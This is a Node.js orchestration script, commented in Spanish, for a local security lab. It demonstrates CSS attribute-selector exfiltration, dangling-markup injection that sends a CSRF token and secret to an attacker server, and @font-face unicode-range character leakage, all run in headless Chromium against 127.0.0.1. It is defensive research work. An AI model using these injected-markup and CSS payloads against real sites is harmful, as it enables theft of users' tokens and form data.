'use strict';
// ============================================================================
// run.js — Orquestador del laboratorio CSS-exfil / DMI (todo local).
//
//   1) Lanza el servidor ATACANTE (8102) y el servidor VÍCTIMA (8101).
//   2) Abre un Chromium REAL (headless, CDP puerto 9244, perfil de laboratorio).
//   3) CSS EXFIL: por cada posición del secreto carga la página víctima con el
//      CSS malicioso (link al atacante); el navegador dispara background-image
//      SOLO hacia el char correcto (selectores de atributo) → el atacante lo
//      registra → el runner reconstruye el secreto entero char a char.
//   4) DMI: la página víctima contiene un <img src='//atacante/dmi? SIN cerrar;
//      el parser se traga el HTML siguiente (el secreto) dentro del src y el
//      navegador lo envía al atacante en una sola petición.
//   5) @FONT-FACE unicode-range: la víctima renderiza el secreto como texto con
//      font-family:evilfont y carga el CSS del atacante (una @font-face por
//      candidato). El navegador SOLO descarga las fuentes de los caracteres
//      realmente presentes → cada petición /font delata un carácter del secreto
//      (detección de presencia en UNA sola ronda, no por posición).
//   6) Guarda log + pantallazos en lab/css-exfil/output/ y hace el assert final
//      + comparación de señal/ruido entre las tres técnicas.
//
// Uso:  node lab/css-exfil/run.js
// ============================================================================
const fs = require('fs');
const path = require('path');
const http = require('http');
const browser = require('../../backend/lib/browser');
const { start: startAttacker } = require('./attacker');

const SECRET = 'S3cRet-XyZ7'; // el secreto que vive en un atributo de la página víctima
const PUERTO_VICTIMA = 8101;
const PUERTO_ATACANTE = 8102;
const PUERTO_CDP = 9244;
const OUT = path.join(__dirname, 'output');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── Servidor VÍCTIMA (origen 8101) ──────────────────────────────────────────
function htmlCss(round, prefix) {
  return `<!DOCTYPE html><html><body>
<h1>Página víctima (origen ${PUERTO_VICTIMA})</h1>
<p>El "atacante" ha conseguido inyectar un <b>&lt;link rel="stylesheet"&gt;</b> hacia su
servidor (${PUERTO_ATACANTE}). El CSS usa selectores de atributo sobre el input de abajo.</p>
<input type="text" name="secret" value="${SECRET}" size="30" />
<link rel="stylesheet" href="http://127.0.0.1:${PUERTO_ATACANTE}/css.css?round=${round}&prefix=${encodeURIComponent(prefix)}" />
</body></html>`;
}

function htmlFont() {
  // El secreto se renderiza como TEXTO visible (no atributo) con la font-family
  // envenenada. El navegador compone cada carácter con la cara @font-face cuyo
  // unicode-range lo cubre; solo descarga las caras de los chars presentes.
  return `<!DOCTYPE html><html><body>
<h1>Página víctima @font-face (origen ${PUERTO_VICTIMA})</h1>
<p>El "atacante" ha inyectado un <b>&lt;link rel="stylesheet"&gt;</b> que define una
@font-face por carácter candidato con unicode-range. El texto de abajo usa
font-family:evilfont — el navegador solo descarga las fuentes de los caracteres
que el secreto contiene.</p>
<div id="target" style="font-family:evilfont">${SECRET}</div>
<link rel="stylesheet" href="http://127.0.0.1:${PUERTO_ATACANTE}/font.css" />
</body></html>`;
}

function htmlDmi() {
  // DMI clásico: <img src='//atacante/? SIN cerrar. Todo el HTML siguiente
  // (que contiene el secreto) queda capturado dentro del atributo src hasta la
  // siguiente comilla, y el navegador lo envía al atacante en una sola petición.
  // IMPORTANTE: todo en UNA línea — Chromium bloquea (blockedReason:other) las
  // URLs de imagen con caracteres de control (newlines) dentro del valor capturado.
  return '<!DOCTYPE html><html><body>' +
    '<h1>Página víctima DMI (origen ' + PUERTO_VICTIMA + ')</h1>' +
    '<p>El "atacante" ha inyectado un <b>&lt;img src=&apos;//atacante/dmi?</b> SIN cerrar: ' +
    'el HTML siguiente (con el secreto) queda dentro del src y viaja al atacante.</p>' +
    "<img src='http://127.0.0.1:" + PUERTO_ATACANTE + '/dmi?<meta name="csrf" content="CSRF-TOKEN-' + SECRET + '">' +
    "'><p>resto de la página normal</p></body></html>";
}

function startVictima() {
  const srv = http.createServer((req, res) => {
    const u = new URL(req.url, `http://127.0.0.1:${PUERTO_VICTIMA}`);
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    if (u.pathname === '/victim-css') {
      res.end(htmlCss(parseInt(u.searchParams.get('round') || '0', 10), u.searchParams.get('prefix') || ''));
    } else if (u.pathname === '/victim-dmi') {
      res.end(htmlDmi());
    } else if (u.pathname === '/victim-font') {
      res.end(htmlFont());
    } else {
      res.end('lab: /victim-css?round=N&prefix=P | /victim-dmi | /victim-font');
    }
  });
  return new Promise((resolve) => srv.listen(PUERTO_VICTIMA, '127.0.0.1', () => resolve(srv)));
}

async function main() {
  fs.mkdirSync(OUT, { recursive: true });
  const atacante = await startAttacker(PUERTO_ATACANTE);
  const victimSrv = await startVictima();
  console.log(`[lab] atacante  http://127.0.0.1:${PUERTO_ATACANTE}  (log en /log)`);
  console.log(`[lab] víctima   http://127.0.0.1:${PUERTO_VICTIMA}/victim-css?round=0&prefix=`);
  console.log(`[lab] secreto real del atributo: "${SECRET}"\n`);

  const canal = await browser.abrirCanal({
    port: PUERTO_CDP,
    perfil: browser.rutaPerfil('css-exfil-lab'),
    headless: true,
  });
  console.log('[lab] Chromium CDP listo en', canal.binario || canal.puerto, '\n');

  // ── FASE 1: CSS EXFILTRATION (char a char) ────────────────────────────────
  let recuperado = '';
  for (let round = 0; round < SECRET.length; round++) {
    const url = `http://127.0.0.1:${PUERTO_VICTIMA}/victim-css?round=${round}&prefix=${encodeURIComponent(recuperado)}`;
    await browser.navegar(canal.send, url);
    await sleep(900); // dejar que el CSS + background-image se disparen
    const entradas = atacante.log.filter((e) => e.path === '/collect' && Number(e.params.round) === round);
    if (entradas.length === 0) {
      console.log(`[css] posición ${round}: ⚠️ sin petición registrada (round ${round})`);
      break;
    }
    const c = entradas[0].params.char;
    recuperado += c;
    console.log(`[css] posición ${round}: char exfiltrado="${c}" → recuperado="${recuperado}"`);
  }
  const okCss = recuperado === SECRET;
  console.log(`\n[css] RESULTADO: recuperado="${recuperado}" | real="${SECRET}" | ${okCss ? '✅ MATCH' : '❌ NO MATCH'}\n`);

  // Pantallazo de la página víctima CSS (con el input y el link al atacante)
  await browser.navegar(canal.send, `http://127.0.0.1:${PUERTO_VICTIMA}/victim-css?round=0&prefix=`);
  await sleep(900);
  for (const f of ['lab-css-exfil-victim.png', 'lab-dmi-victim.png']) {
    try { fs.unlinkSync(path.join(OUT, f)); } catch { /* no existía */ }
    try { fs.unlinkSync(path.join(browser.rutaCaptura(f))); } catch { /* no existía */ }
  }
  const capCss = await browser.capturar(canal.send, 'lab-css-exfil-victim.png', { urlParaNombre: 'victim-css' });
  fs.copyFileSync(capCss.fichero, path.join(OUT, 'css-exfil-victim.png'));
  console.log('[lab] pantallazo víctima CSS →', path.join(OUT, 'css-exfil-victim.png'));

  // ── FASE 2: DMI (dangling markup) ─────────────────────────────────────────
  const antes = atacante.log.length;
  await browser.navegar(canal.send, `http://127.0.0.1:${PUERTO_VICTIMA}/victim-dmi`);
  await sleep(1200);
  const dmi = atacante.log.slice(antes).find((e) => e.path === '/dmi');
  console.log('\n[dmi] petición al atacante:');
  console.log('  path completo:', (dmi && dmi.path + dmi.query) || '(ninguna — ¿la comilla cerró antes?)');
  const capturado = dmi ? decodeURIComponent(dmi.query) : '';
  const okDmi = capturado.includes(SECRET);
  console.log(`[dmi] RESULTADO: el HTML colgante capturado incluye el secreto "${SECRET}"? ${okDmi ? '✅ SÍ' : '❌ NO'}\n`);

  const capDmi = await browser.capturar(canal.send, 'lab-dmi-victim.png', { urlParaNombre: 'victim-dmi' });
  fs.copyFileSync(capDmi.fichero, path.join(OUT, 'dmi-victim.png'));

  // ── FASE 3: @FONT-FACE unicode-range (detección de presencia, 1 ronda) ────
  // CUIDADO con el orden: el link al CSS del atacante debe estar ANTES de que
  // el motor de fuentes resuelva el texto. Cargamos la página y esperamos a
  // que el navegador descargue las caras de los caracteres presentes.
  const antesFont = atacante.log.length;
  await browser.navegar(canal.send, `http://127.0.0.1:${PUERTO_VICTIMA}/victim-font`);
  await sleep(2500); // las descargas de fuentes tardan más que un background-image
  const hitsFont = atacante.log.slice(antesFont)
    .filter((e) => e.path === '/font')
    .map((e) => e.params.char);
  const presentes = [...new Set(SECRET.split(''))].sort().join('');
  const exfiltrados = [...new Set(hitsFont)].sort().join('');
  const okFont = presentes === exfiltrados;
  console.log(`[font] caracteres reales del secreto : "${presentes}" (${presentes.length} únicos)`);
  console.log(`[font] caracteres detectados por el atacante: "${exfiltrados}" (${exfiltrados.length} únicos, ${hitsFont.length} peticiones)`);
  console.log(`[font] RESULTADO: ¿conjunto exacto detectado? ${okFont ? '✅ SÍ' : '❌ NO'}\n`);

  const capFont = await browser.capturar(canal.send, 'lab-font-victim.png', { urlParaNombre: 'victim-font' });
  fs.copyFileSync(capFont.fichero, path.join(OUT, 'font-victim.png'));

  // ── Comparación señal/ruido entre las tres técnicas ───────────────────────
  // Ruido = peticiones que el atacante recibe SIN aportar información nueva:
  //   CSS atributos: (|alfabeto|-1) candidatos descartados por ronda × rondas.
  //   No hay ruido de red: solo la correcta dispara request. Pero el COSTE es
  //   rondas × |alfabeto| reglas y un viaje víctima→atacante por ronda.
  //   Font-face: 1 carga, N peticiones (una por carácter único presente).
  const rondasCss = SECRET.length;
  const candidatosCss = 67; // ALPHABET del attacker.js
  const sNr = {
    'css-atributos': {
      rondas: rondasCss,
      peticionesUtiles: rondasCss,
      reglasGeneradas: rondasCss * candidatosCss,
      tamanoMaxExfil: 'ilimitado (posición a posición)',
      requiere: 'secreto en ATRIBUTO con prefijo matcheable (value^=)',
      detecta: 'orden exacto de los caracteres',
    },
    'font-face-unicode-range': {
      rondas: 1,
      peticionesUtiles: hitsFont.length,
      reglasGeneradas: candidatosCss,
      tamanoMaxExfil: 'conjunto de caracteres presentes (sin orden ni repetición)',
      requiere: 'secreto renderizado como TEXTO con font-family controlable',
      detecta: 'presencia de cada carácter (sin posición)',
    },
    'dmi': {
      rondas: 1,
      peticionesUtiles: okDmi ? 1 : 0,
      reglasGeneradas: 0,
      tamanoMaxExfil: 'todo el HTML posterior hasta la siguiente comilla',
      requiere: 'inyección de markup SIN cerrar antes del secreto',
      detecta: 'el secreto completo en una petición',
    },
  };
  console.log('[señal/ruido]');
  for (const [k, v] of Object.entries(sNr)) console.log(`  ${k}:`, JSON.stringify(v));

  // ── Guardar log + resumen ─────────────────────────────────────────────────
  const resumen = {
    fecha: new Date().toISOString(),
    secretoReal: SECRET,
    cssExfil: { recuperado, ok: okCss, rondas: atacante.log.filter((e) => e.path === '/collect') },
    dmi: { capturado: capturado.slice(0, 200), ok: okDmi, peticion: dmi ? dmi.path + dmi.query : null },
    fontFace: { presentes, exfiltrados, hits: hitsFont, ok: okFont },
    comparacionSenalRuido: sNr,
    notas: 'Lab 100% local (127.0.0.1:8101/8102/9244). No hubo interacción con ningún endpoint en scope.',
  };
  fs.writeFileSync(path.join(OUT, 'resultado.json'), JSON.stringify(resumen, null, 2));
  fs.writeFileSync(path.join(OUT, 'log-atacante.json'), JSON.stringify(atacante.log, null, 2));

  await canal.kill();
  victimSrv.close();
  atacante.srv.close();

  const final = okCss && okDmi && okFont;
  console.log('──────────────────────────────────────────────');
  console.log(`VEREDICTO LAB: ${final ? '✅ las tres técnicas demostradas end-to-end' : '❌ revisar'}`);
  console.log('Salida en lab/css-exfil/output/ (resultado.json, log-atacante.json, pantallazos)');
  process.exit(final ? 0 : 1);
}

main().catch((e) => { console.error('ERR', e.message); process.exit(1); });